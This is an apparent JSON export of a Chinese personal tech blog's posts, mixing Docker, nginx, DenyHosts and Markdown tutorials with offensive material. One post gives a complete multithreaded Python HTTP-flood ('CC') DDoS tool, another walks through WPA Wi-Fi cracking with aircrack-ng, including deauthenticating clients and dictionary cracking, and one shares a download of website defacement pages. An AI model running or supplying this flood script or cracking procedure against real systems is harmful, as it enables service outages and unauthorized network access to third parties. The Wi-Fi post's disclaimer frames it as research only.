[{"title":"黑页","date":"2017-12-06T08:04:16.000Z","path":"2017/12/06/黑页/","text":"简介：从网上收集了一些黑页，个人觉得比较酷，收藏一下。 展示： 纯js黑页： 黑页2 黑页3 黑页4 源码：链接:https://pan.baidu.com/s/1nuTWEhV 密码:9hr4","tags":[{"name":"黑页","slug":"黑页","permalink":"http://www.an-time.top/tags/黑页/"}]},{"title":"docker监控工具---海鸥","date":"2017-12-05T09:14:19.000Z","path":"2017/12/05/docker监控工具-海鸥/","text":"简介：海鸥是Docker的最佳小伙伴，它为Docker实现了一套Web监控页面。使用Docker都希望有Web监控和管理界面，海鸥就是为此量身订造的。它可以通过一行命令安装运行，你在此能够监控你的所有Docker容器和镜像。现在，海鸥已经完美支持英语、简体中文和繁体中文！ 安装：# docker run -d -p 10086:10086 -v /var/run/docker.sock:/var/run/docker.sock tobegit3hub/seagull 测试：安装完后，访问ip:10086，即可进入海鸥的主界面，进行相应的操作。 [参考：https://github.com/tobegit3hub/seagull ]","tags":[{"name":"docker","slug":"docker","permalink":"http://www.an-time.top/tags/docker/"},{"name":"监控","slug":"监控","permalink":"http://www.an-time.top/tags/监控/"},{"name":"海鸥","slug":"海鸥","permalink":"http://www.an-time.top/tags/海鸥/"}]},{"title":"使用DenyHost告别ssh暴力破解","date":"2017-11-29T11:22:40.000Z","path":"2017/11/29/使用DenyHost告别ssh暴力破解/","text":"简介：DenyHosts是Python语言写的一个程序，它会分析sshd的日志文件（/var/log/secure），当发现多次重复的攻击时就会记录IP到/etc/hosts.deny文件，从而达到自动屏IP的功能。 实战： 安装： 使用centos7.4环境 # yum install -y denyhosts 配置： # vim /etc/denyhosts.conf 大部分配置都写好了，做稍微的修改即可： DENY_THRESHOLD_INVALID = 5 #无效用户名限制登陆次数 DENY_THRESHOLD_VALID = 10 #有效用户名限制登陆次数 DENY_THRESHOLD_ROOT = 5 #root限制登陆次数 AGE_RESET_ROOT = 1d #root用户登录失败计数归零的时间 ADMIN_EMAIL = root@localhost #管理员邮箱 设置黑白名单： # vim /etc/hosts.deny # vim /etc/hosts.allow 启动服务并作开机自启： # systemctl enable denyhosts # systemctl start denyhosts enjoy it!!!","tags":[{"name":"安全","slug":"安全","permalink":"http://www.an-time.top/tags/安全/"},{"name":"爆破","slug":"爆破","permalink":"http://www.an-time.top/tags/爆破/"},{"name":"ssh","slug":"ssh","permalink":"http://www.an-time.top/tags/ssh/"},{"name":"DenyHost","slug":"DenyHost","permalink":"http://www.an-time.top/tags/DenyHost/"}]},{"title":"python实现ddos攻击之cc攻击","date":"2017-11-24T02:11:22.000Z","path":"2017/11/24/python实现ddos攻击之cc攻击/","text":"简介：cc攻击是ddos攻击中很难防护的一种，这里参考网上一些资料，用python实现cc攻击。 代码：#!/usr/bin/python #coding=utf-8 import sys import threading import Queue import httplib import argparse def get_parse(): parser = argparse.ArgumentParser(description=&apos;A cc attack python program&apos;) parser.add_argument(&apos;-j&apos;, help=&quot;number of total jobs, default number 100000&quot;, action=&quot;store&quot;, dest=&apos;j&apos;, default=100000, type=int) parser.add_argument(&apos;-n&apos;, help=&quot;number of threads, default thread 100&quot;, action=&apos;store&apos;, dest=&apos;n&apos;, default=100, type=int) parser.add_argument(&apos;-u&apos;, help=&quot;url or ip, for example: &apos;[url]www.zz2u.com[/url]&apos; or &apos;192.157.233.244&apos;&quot;, action=&quot;store&quot;, dest=&quot;u&quot;) parser.add_argument(&apos;-i&apos;, help=&quot;index, for example: &apos;/index.php&apos;, if null input &apos;/&apos; or not use -i,default &apos;/&apos;&quot;, action=&quot;store&quot;, dest=&quot;i&quot;, default=&quot;/&quot;) parser.add_argument(&apos;-p&apos;, help=&quot;port, default 80 &quot;, action=&quot;store&quot;, dest=&quot;p&quot;, default=80, type=int) if(len(sys.argv) &lt; 2): parser.print_help() sys.exit() return parser.parse_args() def get_request(url, index=&apos;/&apos;, port=80): try: conn = httplib.HTTPConnection(url, port, timeout=0.01) conn.request(&quot;GET&quot;, index) r1 = conn.getresponse() #print r1.status, r1.reason except: pass class Worker(threading.Thread): def __init__(self, name, queue, url, index, port): threading.Thread.__init__(self) self.queue = queue self.url = url self.index =index self.port = port self.start() def run(self): # 著名的死循环，保证接着跑下一个任务 while True: # 队列为空则退出线程 if self.queue.empty(): break # 获取一个项目 foo = self.queue.get() # 模拟你要做的事情 get_request(self.url, self.index, self.port) # 打印 print self.getName(),&apos;:&apos;, foo # 告诉系统说任务完成 self.queue.task_done() def start_work(): args = get_parse() job_num = args.j thread_num = args.n url = args.u index = args.i port = args.p #print args, job_num, thread_num, url, index # 队列 queue = Queue.Queue() # 加入任务队列个数 for i in range(job_num): queue.put(i) # 开线程个数 for i in range(thread_num): threadName = &quot;Thread&quot; + str(i) Worker(threadName, queue, url, index, port) # 所有线程执行完毕后关闭 queue.join() if __name__ == &quot;__main__&quot;: start_work()","tags":[{"name":"ddos","slug":"ddos","permalink":"http://www.an-time.top/tags/ddos/"},{"name":"cc","slug":"cc","permalink":"http://www.an-time.top/tags/cc/"}]},{"title":"破解Wi-Fi密码","date":"2017-11-07T13:03:46.000Z","path":"2017/11/07/破解Wi-Fi密码/","text":"简介：目前无线渗透试的两种方法：1、抓握手包，跑包。2、通过WPS进行跑pin码当然第2种方法是要求路由器开启了wps功能。并且要求路由器没有设置pin防护，其它的方法如路由器漏洞等不在此讨论范围内。WEP方式认证的路由器已经很少了，而且这种认证方式不但非常不安全且绝对可破，不再讲解，本文只讲WPA认证方式的渗透方法。其实最有效的取得密码的方法是直接编个理由过去问！（社工）原理：抓到的包中有密码的密文，做暴力跑包即可。 工具： kali操作系统 一个支持监听模式的无线网卡 步骤：1.开启无线网卡监听模式 查看无线网卡 $ifconfig -a 可以从上图看出设备识别的无线网卡名字为wlan0 激活无线网卡 $ifconfig wlan0 up 没有任何提示，在linux下没有报错就是没有错 杀死干扰进程 $airmon-ng check kill 从上面图片可以看出，有关干扰进程都被杀掉 开启网卡监听模式 $airmon-ng start wlan0 使用上面的命令开启网卡的监听模式，记录下监听模式的名字，为mon0，如下图 再次查看设备，发现多出来一个监听模式的网卡信息，见下图 2.监听周围wifi状态，寻找要破解的无线路由器$airodump-ng mon0 使用上面的命令，可以监听到周围的无线网络，从中选择我们要破解的路由器的ssid，见下图 1:路由器mac地址 2:信号强度 3:路由器工作频道 4:wifi名字 5:连接在路由器的客户端的mac地址 3.监听要破解的路由器，攻击连接的无线设备使其自动掉线然后重连，来抓取握手包下面我们来破解名字为14_102的路由器，可以看出其mac地址为8C:A6:DF:69:DB:33，信道为6，使用下面命令监听该路由器并把监听的数据保存到名字为wifi里 $airodump-ng mon0 -c 6 --bssid 8C:A6:DF:69:DB:33 -w wifi -c:信道 –bssid:路由器mac地址 -w:保存数据的名字 在另一个终端来攻击连在该路由器的客户端，使其掉线然后自动重连，就能监控到含有密码的握手包 $aireplay-ng -0 1 -a 8C:A6:DF:69:DB:33 -c 00:CD:FE:65:46:5A mon0 -a:路由器mac地址 -c:客户端的mac地址，可以不加该参数，会把连在该路由器上的所有客户端搞掉线 测试的客户端是我的手机，发现手机掉线了，然后自动重新连接wifi。自动连接上后（握手成功），看到在监听端口出现如下标志，说明抓取握手包成功，可以停止攻击和监控 查看抓到的包的数据如下图 4.用字典跑包下面用我们的字典来跑抓到的数据包 $aircrack-ng -w dic.txt wifi-01.cap 成功爆出密码 说明：此文仅用于研究测试，请不要做破坏，博主不承担任何责任。。。。。。","tags":[{"name":"破解wifi","slug":"破解wifi","permalink":"http://www.an-time.top/tags/破解wifi/"},{"name":"kali","slug":"kali","permalink":"http://www.an-time.top/tags/kali/"},{"name":"aircrack-ng","slug":"aircrack-ng","permalink":"http://www.an-time.top/tags/aircrack-ng/"}]},{"title":"docker swarm集群搭建","date":"2017-11-06T03:28:22.000Z","path":"2017/11/06/docker-swarm集群搭建/","text":"简介：dokcer swarm是一个docker集群管理工具，把大量的docker容器集中管理，类似的还有k8s等。 准备：本案例需要2台以上机器，这里使用docker machine来生成3台虚拟机来测试。可根据自己资源多少来选择不同的方案。创建一个管理节点机器manager1，两个工作节点worker1和worker2 #docker-machine create --driver virtualbox manager1 #docker-machine create --driver virtualbox worker1 #docker-machine create --driver virtualbox worker2 现在，有两三台虚拟机，我们查看一下： #docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS manager1 - virtualbox Running tcp://192.168.99.100:2376 v17.10.0-ce worker1 - virtualbox Running tcp://192.168.99.103:2376 v17.10.0-ce worker2 - virtualbox Running tcp://192.168.99.104:2376 v17.10.0-ce 创建swarm集群：用上面创建的3台虚拟机，来创建一个swarm集群，首先进入管理节点： #docker-machine ssh manager1 #docker swarm init --listen-addr 192.168.99.100:2377 --advertise-addr 192.168.99.100 Swarm initialized: current node (23lkbq7uovqsg550qfzup59t6) is now a manager. To add a worker to this swarm, run the following command: docker swarm join \\ --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r \\ 192.168.99.100:2377 To add a manager to this swarm, run &apos;docker swarm join-token manager&apos; and follow the instructions. 上面用 –listen-addr来指定监听的ip和端口。 接下来把worker1和worker2加入集群： #docker-machine ssh worker1 #docker swarm join --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r 192.168.99.100:2377 #docker-machine ssh worker2 #docker swarm join --token SWMTKN-1-3z5rzoey0u6onkvvm58f7vgkser5d7z8sfshlu7s4oz2gztlvj-c036gwrakjejql06klrfc585r 192.168.99.100:2377 上面可以加入参数–listen-addr作为监听准备，因为有时候可能遇到把一个worker节点提升为manager节点。本例不添加。 初始化成功后，现在，我们拥有了一个主节点两个从节点的swarm集群，进入管理节点查看一下相应信息： #docker-machine ssh manager1 #docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS tdbdcsorrtqymgmn71t5pfwxm * manager1 Ready Active Leader b5twxb6zeacvndsklkxenlhk2 worker1 Ready Active xdvapziebpux1iee52d4tvqa9 worker2 Ready Active 现在，每个节点都归属于swarm，并处于待机状态。manager1是管理节点，worker1和worker2是工作节点。 在管理节点上查看网络状态： #docker-machine ssh manager1 #docker network ls NETWORK ID NAME DRIVER SCOPE de994a4d6a4f bridge bridge local ca45f2e489de docker_gwbridge bridge local 3d22755e453b host host local rgpmn1hh5qe1 ingress overlay swarm 86b55cffdbd2 none null local 可以看到在 swarm 上默认已有一个名为 ingress 的 overlay 网络, 默认在 swarm 里使用，本例子中会创建一个新的 overlay 网络。 #docker network create --driver overlay swarm_test #docker network ls NETWORK ID NAME DRIVER SCOPE de994a4d6a4f bridge bridge local ca45f2e489de docker_gwbridge bridge local 3d22755e453b host host local rgpmn1hh5qe1 ingress overlay swarm 86b55cffdbd2 none null local n9jduvforkcm swarm_test overlay swarm 可以看到我们创建的网络swarm_test。 在跨主机网络上部署应用：首先，分别在各个节点上下载一个要部署应用的镜像： #docker-machine ssh manager1 #docker pull nginx #docker-machine ssh worker1 #docker pull nginx #docker-machine ssh worker2 #docker pull nginx 上面分别在3个节点上下载了nginx的镜像，下面在swarm中部署nginx应用： #docker service create --replicas 2 -p 7080:80 --name hello --networ=swarm_test nginx 查看服务： #docker service ls ID NAME MODE REPLICAS IMAGE PORTS sl4zi20wk6um hello replicated 2/2 nginx:latest *:7080-&gt;80/tcp 查看hello的详细情况： #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS 0b3pykmkl7i9 hello.2 nginx:latest manager1 Running Running 2 hours ago s7ud2yba1p0r hello.3 nginx:latest worker1 Running Running 2 hours ago 可以看出，两个容器分别运行在管理节点和worker1节点。 swarm自我修复能力：上面我们创建的service里面有两个实例，现在我们尝试一下杀掉其中一个实例，观察其反应： 杀掉worker1中的容器： #docker-machine ssh worker1 #docker kill 4f9d65b4ab70 查看服务实例状态： #docker-machine ssh manager1 #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS z9jbg1psmh7n hello.1 nginx:latest worker1 Running Running 1 second ago jhfcp9axso7m \\_ hello.1 nginx:latest worker1 Shutdown Failed 7 seconds ago &quot;task: non-zero exit (137)&quot; y8rbt67vpkfe hello.2 nginx:latest manager1 Running Running 5 minutes ago 可以看到，其中一个容器为shutdown状态，然后又启动了另外一个容器来代替关闭的容器 动态修改实例数：假如某个服务负载过大，我们可以对该服务动态平滑的扩容，当负载减下来的时候，可以减少容器数量，只需指定scale参数即可。我们用上面创建的hello服务来说明： #docker-machines ssh manager1 #docker service scale hello=3 hello scaled to 3 overall progress: 3 out of 3 tasks 1/3: running [==================================================&gt;] 2/3: running [==================================================&gt;] 3/3: running [==================================================&gt;] verify: Service converged 此时，查看服务，发现容器数量变成3个了： #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS veq6koi71ff8 hello.1 nginx:latest manager1 Running Running 26 seconds ago e42vqpp5fvbf hello.2 nginx:latest worker1 Running Running 26 seconds ago tic4n5absao7 hello.3 nginx:latest worker2 Running Running 12 seconds ago 现在，我们把容器减少到2个： #docker service scale hello=2 hello scaled to 2 overall progress: 2 out of 2 tasks 1/2: running [==================================================&gt;] 2/2: running [==================================================&gt;] verify: Service converged 此时，查看服务，发现容器数量变成了2: #docker service ps hello ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS e42vqpp5fvbf hello.2 nginx:latest worker1 Running Running 3 minutes ago tic4n5absao7 hello.3 nginx:latest worker2 Running Running 3 minutes ago 删除服务：假如某个服务我们不在需要了，可以直接把高服务删除。现在我们把上面创建的hello服务删除： #docker-machines ssh managers1 #docker service rm hello 再次查看服务，发现hello服务已经被删除了： #docker service ls ID NAME MODE REPLICAS IMAGE PORTS 删除节点：完成上面的测试，最终删除我们的虚拟机manager1，worker1和worker2: #docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS manager1 - virtualbox Running tcp://192.168.99.100:2376 v17.10.0-ce worker1 - virtualbox Running tcp://192.168.99.103:2376 v17.10.0-ce worker2 - virtualbox Running tcp://192.168.99.104:2376 v17.10.0-ce 删除虚拟机： #docker-machine rm manager1 worker1 worker2 About to remove manager1, worker1, worker2 WARNING: This action will delete both local reference and remote instance. Are you sure? (y/n): y Successfully removed manager1 Successfully removed worker1 Successfully removed worker2 再次查看，已经没有了： #docker-machine ls NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS 结尾：swarm的基本姿势大致如上，我们可以把他用在我们的生产环境，与持续集成，持续部署等结合起来，最终可以达到无人值守的目的。","tags":[{"name":"docker swarm","slug":"docker-swarm","permalink":"http://www.an-time.top/tags/docker-swarm/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://www.an-time.top/tags/虚拟化/"},{"name":"集群","slug":"集群","permalink":"http://www.an-time.top/tags/集群/"}]},{"title":"短网址还原工具","date":"2017-10-24T01:20:10.000Z","path":"2017/10/24/短网址还原工具/","text":"简介：随着安全意识的不断提升，很多都开始使用短网址。这里写了一个小工具，实现把短网址还原成原来的网址。 实现：#coding = utf8 import urllib2, httplib, os, sys class RedirectHandler(urllib2.HTTPRedirectHandler): def http_error_301(self, req, fp, code, msg, headers): result = urllib2.HTTPRedirectHandler.http_error_301(self, req, fp, code, msg, headers) result.status = code return result def http_error_302(self, req, fp, code, msg, headers): result = urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers) result.status = code return result # Banner def Banner(): print(&quot;=================================================&quot;) print(&quot; pyLongURL &quot;) print(&quot;=================================================&quot;) # Usage def help_menu(cmd): print(&quot;Usage: %s &lt;short_URL&gt;\\n&quot;) % (cmd) print(&quot;Please enter need an URL!&quot;) def main(szURL): httplib.HTTPConnection.debuglevel = 1 request = urllib2.Request(szURL) opener = urllib2.build_opener(RedirectHandler()) f = opener.open(request) print(f.url) if __name__ == &quot;__main__&quot;: Banner() if len(sys.argv)&lt;2: help_menu(sys.argv[0]) else: main(sys.argv[1]) 测试：","tags":[{"name":"短网址还原","slug":"短网址还原","permalink":"http://www.an-time.top/tags/短网址还原/"},{"name":"工具","slug":"工具","permalink":"http://www.an-time.top/tags/工具/"}]},{"title":"用nginx搭建文件服务器","date":"2017-09-22T03:15:53.000Z","path":"2017/09/22/用nginx搭建文件服务器/","text":"简介工作需要，搭建一个文件服务器。 环境介绍先创建一台虚拟机，ip地址为：106.14.242.15 实战 配置源系统源 # wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo 安装nginx # yum install nginx -y 查找配置文件 # rpm -qc nginx 可以看到配置文件如下图： 修改配置文件 #cat /etc/nginx/nginx.conf # For more information on configuration, see: # * Official English Documentation: http://nginx.org/en/docs/ # * Official Russian Documentation: http://nginx.org/ru/docs/ user nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; events { worker_connections 1024; } http { log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; # Load modular configuration files from the /etc/nginx/conf.d directory. # See http://nginx.org/en/docs/ngx_core_module.html#include # for more information. include /etc/nginx/conf.d/*.conf; server { listen 80 ; server_name test.file.com; charset utf-8; # Load configuration files for the default server block. location / { root /data; index index.php index.html index.htm; autoindex on; autoindex_exact_size on; autoindex_localtime on; } access_log /var/log/file.log; error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } } 创建文件目录和测试数据 # mkdir /data # cd /data # touch 123.txt # echo &apos;test&apos; &gt; 123.txt 结果测试浏览器访问地址，如下图：","tags":[{"name":"nginx","slug":"nginx","permalink":"http://www.an-time.top/tags/nginx/"},{"name":"文件服务器","slug":"文件服务器","permalink":"http://www.an-time.top/tags/文件服务器/"}]},{"title":"Markdown教程","date":"2017-08-14T14:54:19.000Z","path":"2017/08/14/Markdown教程/","text":"简介：Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。Markdown 从写作到完成，导出格式随心所欲，你可以导出 HTML 格式的文件用来网站发布，也可以十分方便的导出 PDF 格式。 1. 标题为了获得上面的 “1. 标题”， 在 Markdown 编辑器里输入： 1# 1. 标题 “#” 后最好加个空格。除此之外，还有 5 级标题，依次有不同的字体大小，即 12345## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 这样就有： 二级标题三级标题四级标题五级标题六级标题 2. 字体最常用的强调方式，那就是 加粗 了，你得这样： 1最常用的强调方式，那就是 **加粗** 了，你得这样： 通常我喜欢在 “**加粗的部分**” 旁边各加一个空格，当然你也可以不这样。斜体则多用在于书名，比如：我从来没看过 Jane Eyre 1斜体则多用在于书名，比如：我从来没看过 *Jane Eyre* 但中文的斜体我觉得真是不美，像：《简 · 爱》，一般还是别用了。 3. 层次比如写个读书笔记，你得 第一章 第一节 第二节(你不用敲 “2”，自动就有了） 第一小节（推荐每层次缩进四个空格） 小小节 1 小小节 2 第二小节 也不难： 12345678#### 第一章1. 第一节* 第二节(你不用敲 &quot;2&quot;，自动就有了） * 第一小节（推荐每层次缩进四个空格） * 小小节 1 * 小小节 2 * 第二小节 “*” 后面要加空格，这是必须的，除了 *，还可以使用 + 或者 -。 如果格式出现问题，多加个空行，一般就好了。 4. 链接，图片你：我没读过 Jane Eyre我：以后别跟我说话！你：。。。我：我也没读过，但是， Jane Eyre is not just Jane Eyre 12我：我也没读过，但是， [***Jane Eyre***](http://book.douban.com/subject/1141406/) is not just ***Jane Eyre***![](http://img3.douban.com/mpic/s1108264.jpg) 5. 其他你可能还没注意到本文每部分之间的分割线和 其他 的链接其实没有链接我爱 分割线， 我爱 链接，哪怕它只有颜色~ 12345678---# [5. 其他][null-link]你可能还没注意到本文每部分之间的分割线和 `其他` 的链接其实没有链接我爱 `分割线`， 我爱 [**链接**][null-link]，哪怕它只有颜色~[null-link]: chrome://not-a-link “---” 的上下最好各空一行 P.S. 补充一种高端的链接: 鼠标移过来，先别单击 ~ 代码如下： 12**P.S.** 补充一种高端的链接: [鼠标移过来，**先别单击** ~][hover][hover]: http://www.google.com.sg &quot;Google Sg 更快，更好用。好，现在单击吧&quot; （可惜 Google 被墙了） P.P.S. 图片链接：(点击图片可跳转） 代码如下：123[![][jane-eyre-pic]][jane-eyre-douban][jane-eyre-pic]: http://img3.douban.com/mpic/s1108264.jpg[jane-eyre-douban]: http://book.douban.com/subject/1141406/ （简书最新的 Markdown 不能使用图片链接。。。感受不爱）P.P.P.S. 更多的 Markdown 特性测试，见我的 Markdown 一篇博客 在简书中输入数学公式：见我的 简书中编辑数学公式 如何写出漂亮的 Markdown 文章？戳 Markdown 写作规范参考","tags":[{"name":"Markdown","slug":"Markdown","permalink":"http://www.an-time.top/tags/Markdown/"}]}]